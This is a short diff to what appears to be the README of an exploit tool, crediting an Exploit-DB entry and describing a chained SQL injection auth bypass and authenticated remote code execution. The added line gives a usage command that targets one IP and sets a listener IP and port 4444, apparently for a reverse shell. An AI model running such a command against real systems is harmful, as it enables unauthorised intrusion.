@@ -10,3 +10,6 @@ Secure77
 https://www.exploit-db.com/exploits/49843
 
 I just modified it to chain the SQLI Auth bypass and Auth RCE together
+
+Example:
+python exploit.py -t 10.1.1.234 -i 10.2.1.5 -r 4444
